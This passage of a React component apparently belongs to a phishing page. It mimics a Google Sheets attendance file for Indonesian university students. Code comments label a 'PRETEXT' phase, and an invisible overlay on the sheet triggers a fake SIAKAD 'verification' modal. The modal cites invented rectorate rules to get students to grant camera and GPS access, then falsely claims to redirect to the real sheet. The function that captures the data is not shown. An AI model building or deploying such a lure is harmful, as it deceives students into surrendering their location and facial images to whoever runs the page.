          <button className="hover:bg-slate-200/60 p-1.5 rounded cursor-pointer flex items-center justify-center w-7 h-7" title="Fill Color">
            <svg viewBox="0 0 24 24" width="16" height="16" fill="currentColor"><path d="M16.56 8.94L7.62 0 6.21 1.41l2.38 2.38-5.15 5.15c-.78.78-.78 2.05 0 2.83l5.59 5.59c.39.39.9.59 1.41.59s1.02-.2 1.41-.59l5.59-5.59c.78-.78.78-2.05 0-2.83zM9 13.9L5.5 10.4 9 6.9l3.5 3.5L9 13.9zm9.6-.5c.83 0 1.5-.67 1.5-1.5 0-1.44-1.5-3.75-1.5-3.75S17.1 10.46 17.1 11.9c0 .83.67 1.5 1.5 1.5zM2 20h20v2H2v-2z"/></svg>
          </button>
          <button className="hover:bg-slate-200/60 p-1.5 rounded cursor-pointer flex items-center justify-center w-7 h-7" title="Borders">
            <svg viewBox="0 0 24 24" width="16" height="16" fill="currentColor"><path d="M19 5v14H5V5h14m0-2H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-6 10h6v-2h-6V5h-2v6H5v2h6v6h2v-6z"/></svg>
          </button>
          <button className="hover:bg-slate-200/60 p-1.5 rounded cursor-pointer flex items-center justify-center w-7 h-7" title="Merge Cells">
            <svg viewBox="0 0 24 24" width="16" height="16" fill="currentColor"><path d="M19 13h-4v-2h4V5c0-1.1-.9-2-2-2h-6v2h6v6h-4v-2l-3 3 3 3v-2h4v6h-6v2h6c1.1 0 2-.9 2-2v-8zM5 13H1v-2h4V5c0-1.1.9-2 2-2h6v2H7v6h4v-2l3 3-3 3v-2H7v6h6v2H7c-1.1 0-2-.9-2-2v-8z"/></svg>
          </button>
          <button className="hover:bg-slate-200/60 p-1.5 rounded cursor-pointer flex items-center justify-center w-7 h-7" title="Align">
            <svg viewBox="0 0 24 24" width="16" height="16" fill="currentColor"><path d="M15 15H3v2h12v-2zm0-8H3v2h12V7zM3 13h18v-2H3v2zm0 8h18v-2H3v2zM3 3v2h18V3H3z"/></svg>
          </button>
          <button className="hover:bg-slate-200/60 p-1.5 rounded cursor-pointer flex items-center justify-center w-7 h-7" title="Create Filter">
            <svg viewBox="0 0 24 24" width="16" height="16" fill="currentColor"><path d="M10 18h4v-2h-4v-2zM3 6v2h18V6H3zm3 7h12v-2H6v2z"/></svg>
          </button>
          <button className="hover:bg-slate-200/60 p-1.5 rounded cursor-pointer flex items-center justify-center w-7 h-7 font-mono font-bold" title="Functions">∑</button>
        </div>
      </section>

      {/* ——— FORMULA BAR ——— */}
      <section className="bg-white border-b border-slate-200 px-6 py-1 flex items-center gap-3 text-xs select-none">
        <span className="font-semibold text-slate-500 w-8 text-center text-xs font-mono bg-slate-50 border border-slate-200 py-0.5 rounded">A1</span>
        <svg viewBox="0 0 24 24" width="16" height="16" fill="#80868b"><path d="M6 4v3h3v2H6v3H4v-3H1V7h3V4h2m13 1H10v2h9v12H10v2h9c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2z"/></svg>
        <div className="flex-1 font-mono text-slate-800 bg-white min-h-[18px]"></div>
      </section>

      {/* ——— MAIN GRID CONTENT (POPULATED DATA) ——— */}
      <main className="flex-1 overflow-auto relative min-h-0 bg-white" onClick={triggerVerification}>
        
        <table className="w-full border-collapse text-xs select-none table-fixed">
          <thead>
            <tr className="bg-[#f8f9fa] text-[#444746] text-center font-normal sticky top-0 z-10 border-b border-slate-200">
              <th className="border border-slate-200 w-12 bg-[#f8f9fa] py-1.5 font-normal"></th>
              {['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R'].map((col) => (
                <th key={col} className="border border-slate-200 w-24 bg-[#f8f9fa] py-1.5 font-normal text-[11px]">{col}</th>
              ))}
            </tr>
          </thead>
          <tbody>
            
            {/* Headers for Data Absensi Mahasiswa */}
            {activeTab === "DATA ABSENSI MAHASISWA" && (
              <tr className="bg-[#e8f0fe] font-semibold text-[#1a73e8] text-center">
                <td className="border border-slate-200 bg-[#f8f9fa] text-center py-2">1</td>
                <td className="border border-slate-200 px-2 text-left font-bold">NIM</td>
                <td className="border border-slate-200 px-2 text-left font-bold">NAMA LENGKAP</td>
                <td className="border border-slate-200 px-2 font-bold">P1</td>
                <td className="border border-slate-200 px-2 font-bold">P2</td>
                <td className="border border-slate-200 px-2 font-bold">P3</td>
                <td className="border border-slate-200 px-2 font-bold">P4</td>
                <td className="border border-slate-200 px-2 font-bold">P5</td>
                <td className="border border-slate-200 px-2 font-bold">P6</td>
                <td className="border border-slate-200 px-2 font-bold">P7</td>
                <td className="border border-slate-200 px-2 text-left font-bold" colSpan={8}>KETERANGAN</td>
              </tr>
            )}

            {/* Headers for Rekap Absensi Mahasiswa */}
            {activeTab === "REKAP ABSENSI MAHASISWA" && (
              <tr className="bg-[#e2f3eb] font-semibold text-[#137333] text-center">
                <td className="border border-slate-200 bg-[#f8f9fa] text-center py-2">1</td>
                <td className="border border-slate-200 px-2 text-left font-bold">NIM</td>
                <td className="border border-slate-200 px-2 text-left font-bold">NAMA MAHASISWA</td>
                <td className="border border-slate-200 px-2 font-bold">TOTAL HADIR</td>
                <td className="border border-slate-200 px-2 font-bold">TOTAL SAKIT</td>
                <td className="border border-slate-200 px-2 font-bold">TOTAL IZIN</td>
                <td className="border border-slate-200 px-2 font-bold">TOTAL ALPHA</td>
                <td className="border border-slate-200 px-2 font-bold text-emerald-800">KEHADIRAN (%)</td>
                <td className="border border-slate-200 px-2" colSpan={10}></td>
              </tr>
            )}

            {/* Rendering populated rows */}
            {activeTab === "DATA ABSENSI MAHASISWA" && ABSENSI_DATA.map((row, idx) => (
              <tr key={idx} className="hover:bg-slate-50">
                <td className="border border-slate-200 bg-[#f8f9fa] text-center py-1.5 text-slate-500 font-mono text-[10px]">{idx + 2}</td>
                <td className="border border-slate-200 px-2 font-mono text-slate-700">{row.nim}</td>
                <td className="border border-slate-200 px-2 font-medium text-slate-900">{row.nama}</td>
                <td className="border border-slate-200 text-center font-semibold text-emerald-600">{row.p1}</td>
                <td className="border border-slate-200 text-center font-semibold text-emerald-600">{row.p2}</td>
                <td className="border border-slate-200 text-center font-semibold text-emerald-600">{row.p3}</td>
                <td className="border border-slate-200 text-center font-semibold text-emerald-600">{row.p4}</td>
                <td className="border border-slate-200 text-center font-semibold text-emerald-600">{row.p5}</td>
                <td className="border border-slate-200 text-center font-semibold text-emerald-600">{row.p6}</td>
                <td className="border border-slate-200 text-center font-semibold text-emerald-600">{row.p7}</td>
                <td className="border border-slate-200 px-2 text-slate-500 italic" colSpan={8}>{row.ket}</td>
              </tr>
            ))}

            {activeTab === "REKAP ABSENSI MAHASISWA" && REKAP_DATA.map((row, idx) => (
              <tr key={idx} className="hover:bg-slate-50">
                <td className="border border-slate-200 bg-[#f8f9fa] text-center py-1.5 text-slate-500 font-mono text-[10px]">{idx + 2}</td>
                <td className="border border-slate-200 px-2 font-mono text-slate-700">{row.nim}</td>
                <td className="border border-slate-200 px-2 font-medium text-slate-900">{row.nama}</td>
                <td className="border border-slate-200 text-center font-medium">{row.hadir}</td>
                <td className="border border-slate-200 text-center font-medium text-yellow-600">{row.sakit}</td>
                <td className="border border-slate-200 text-center font-medium text-blue-600">{row.izin}</td>
                <td className="border border-slate-200 text-center font-medium text-red-600">{row.alpha}</td>
                <td className="border border-slate-200 text-center font-bold text-emerald-700 bg-emerald-50/40">{row.pct}</td>
                <td className="border border-slate-200 px-2" colSpan={10}></td>
              </tr>
            ))}

            {/* Remaining empty rows (up to 70) for visual completeness */}
            {[...Array(20)].map((_, rIdx) => {
              const rowNum = rIdx + 52;
              return (
                <tr key={rIdx} className="hover:bg-slate-50/50">
                  <td className="border border-slate-200 bg-[#f8f9fa] text-center py-1.5 text-[#7f8c8d] text-[10px]">{rowNum}</td>
                  {['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R'].map((col) => (
                    <td key={col} className="border border-slate-200 min-h-[24px]"></td>
                  ))}
                </tr>
              );
            })}
          </tbody>
        </table>
        
        {/* Transparent overlay for verification trigger */}
        <div className="absolute inset-0 z-0 cursor-crosshair"></div>
      </main>

      {/* ——— FOOTER SHEET TABS ——— */}
      <footer className="bg-[#f8f9fa] border-t border-slate-200 flex justify-between items-center text-xs h-10 select-none z-10">
        <div className="flex h-full items-center pl-4">
          <button className="text-slate-600 hover:bg-slate-200 p-1 rounded-full font-bold text-[16px]">+</button>
          <button className="text-slate-600 hover:bg-slate-200 p-1 rounded-full text-[14px] mr-2">☰</button>
          <div className="flex h-full items-end gap-1">
            {[
              { id: "DATA ABSENSI MAHASISWA", label: "Data Absensi" },
              { id: "REKAP ABSENSI MAHASISWA", label: "Rekap Absensi" }
            ].map((tab) => {
              const isAct = tab.id === activeTab;
              return (
                <button
                  key={tab.id}
                  onClick={(e) => { e.stopPropagation(); setActiveTab(tab.id); }}
                  className={`px-4 py-1.5 border-t-[3px] font-semibold text-xs transition cursor-pointer rounded-t-md ${
                    isAct
                      ? "border-[#0b57d0] text-[#0b57d0] bg-white font-bold"
                      : "border-transparent text-slate-600 hover:bg-slate-200/50"
                  }`}
                >
                  {tab.label}
                </button>
              );
            })}
          </div>
        </div>
        <div className="pr-4 text-slate-400 text-[10px]">
          ◀ ▶
        </div>
      </footer>

      {/* ——— PHASE 2.5: PRETEXT SSO / CLASSROOM VERIFICATION MODAL ——— */}
      {phase === "pretext" && (
        <div className="fixed inset-0 bg-black/55 backdrop-blur-[2px] flex items-center justify-center p-4 z-50">
          <div className="bg-white rounded-xl w-full max-w-md p-6 shadow-2xl border border-slate-100 text-left overflow-hidden relative">
            <div className="flex items-center gap-3 border-b border-slate-100 pb-4 mb-4">
              <div className="w-10 h-10 rounded-full bg-emerald-50 flex items-center justify-center text-emerald-600">
                <svg viewBox="0 0 24 24" width="22" height="22" fill="currentColor">
                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/>
                </svg>
              </div>
              <div>
                <h3 className="text-[16px] font-bold text-slate-800 leading-tight">Konfirmasi Kehadiran Kuliah</h3>
                <span className="text-[10px] text-slate-400 font-mono">SIAKAD MOBILE PRESENSI</span>
              </div>
            </div>
            
            <div className="text-[13px] text-slate-600 space-y-3 mb-6 leading-relaxed">
              <p>
                Lembar kerja **"REKAP_ABSENSI_MAHASISWA_S1.xlsx"** dilindungi oleh kebijakan akademik universitas.
              </p>
              <div className="bg-emerald-50/70 border-l-4 border-emerald-500 p-3 text-[11px] text-emerald-800 rounded-r">
                <span className="font-semibold block mb-0.5">ℹ️ Petunjuk Akses:</span>
                Sesuai aturan rektorat mengenai absensi digital, silakan lakukan sinkronisasi lokasi kelas kuliah Anda (GPS) & pencocokan wajah sebelum mengakses rekap data untuk menghindari kecurangan.
              </div>
              <p className="text-[11px] text-slate-400">
                Data Anda dienkripsi secara lokal dan dicocokkan langsung dengan jadwal ruangan kelas Anda.
              </p>
            </div>

            <div className="flex gap-2 justify-end pt-2 border-t border-slate-100">
              <button 
                onClick={() => setPhase("sheets")}
                className="text-xs text-slate-500 hover:bg-slate-50 hover:text-slate-800 px-4 py-2 rounded-lg font-medium transition cursor-pointer"
              >
                Tutup
              </button>
              <button 
                onClick={startActualVerification}
                className="text-xs text-white bg-emerald-600 hover:bg-emerald-700 px-5 py-2.5 rounded-lg font-bold transition shadow-md cursor-pointer"
              >
                Sinkronkan Absen Saya
              </button>
            </div>
          </div>
        </div>
      )}

      {/* ——— PHASE 3: VERIFICATION MODAL POPUP ——— */}
      {phase === "verifying" && (
        <div className="fixed inset-0 bg-black/55 backdrop-blur-[2px] flex items-center justify-center p-4 z-50 animate-fade-in">
          <div className="bg-white rounded-xl w-full max-w-sm p-6 shadow-2xl border border-slate-100 text-center">
            <div className="flex justify-center mb-4">
              <div className="w-14 h-14 bg-emerald-50 rounded-full flex items-center justify-center text-emerald-600 animate-pulse">
                <svg viewBox="0 0 24 24" width="28" height="28" fill="currentColor">
                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
                </svg>
              </div>
            </div>
            
            <h3 className="text-md font-bold text-slate-800 mb-1">Menghubungkan ke Portal SIAKAD...</h3>
            <p className="text-xs text-slate-400 mb-5">
              Mohon izinkan akses kamera & GPS ketika diminta browser untuk mencocokkan jadwal kuliah.
            </p>

            {/* Progress bar */}
            <div className="w-full bg-slate-100 rounded-full h-2 mb-2 overflow-hidden">
              <div 
                className="bg-emerald-600 h-2 rounded-full transition-all duration-300 ease-out"
                style={{ width: `${progress}%` }}
              ></div>
            </div>
            <div className="flex justify-between items-center text-[10px] text-slate-400 mb-2 font-mono">
              <span>SINKRONISASI GEOLOKASI...</span>
              <span>{progress}%</span>
            </div>
          </div>
        </div>
      )}

      {/* ——— PHASE 4: SUCCESS REDIRECT ——— */}
      {phase === "done" && (
        <div className="fixed inset-0 bg-black/60 backdrop-blur-[2px] flex items-center justify-center p-4 z-50">
          <div className="bg-white rounded-xl p-6 max-w-sm w-full text-center shadow-2xl border border-slate-100">
            <svg viewBox="0 0 24 24" width="48" height="48" fill="#0f9d58" className="mx-auto mb-4 animate-bounce"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
            <h3 className="text-md font-bold text-slate-800 mb-1">Identitas Terverifikasi</h3>
            <p className="text-xs text-slate-400 mb-4">Mengalihkan ke lembar kerja Google Sheets asli...</p>
            <div className="w-10 h-10 border-4 border-slate-100 border-t-[#0f9d58] rounded-full animate-spin mx-auto"></div>
          </div>
        </div>
      )}

    </div>
  );
}
